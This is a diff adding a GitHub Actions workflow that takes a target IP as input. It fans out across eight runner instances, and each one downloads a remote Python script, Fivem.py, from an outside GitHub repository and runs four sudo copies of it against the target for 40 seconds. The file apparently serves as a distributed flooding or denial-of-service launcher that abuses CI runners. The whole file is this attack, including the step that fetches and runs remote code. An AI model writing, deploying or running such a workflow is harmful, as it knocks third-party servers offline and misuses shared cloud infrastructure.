@@ -1,0 +1,43 @@
+name: Discord !
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "IP !"
+        required: true
+        default: "127.0.0.1"
+        
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 35
+      matrix:
+        instance: [1,2,3,4,5,6,7,8]
+
+    steps:
+      - name: Checkout (optional)
+        uses: actions/checkout@v4
+
+      - name: OK !
+        run: |
+          TARGET="${{ inputs.target }}"
+          
+          wget https://github.com/veysiustayemek-wq/test/raw/refs/heads/main/Fivem.py
+          chmod +x Fivem.py || true
+          
+          PIDS=()
+          for i in {1..4}; do
+            sudo timeout 40 python3 Fivem.py "$TARGET" &
+            PIDS+=($!)
+          done
+
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+          
+      - name: Finish !
+        run: |
+          sleep 40
+          exit 0
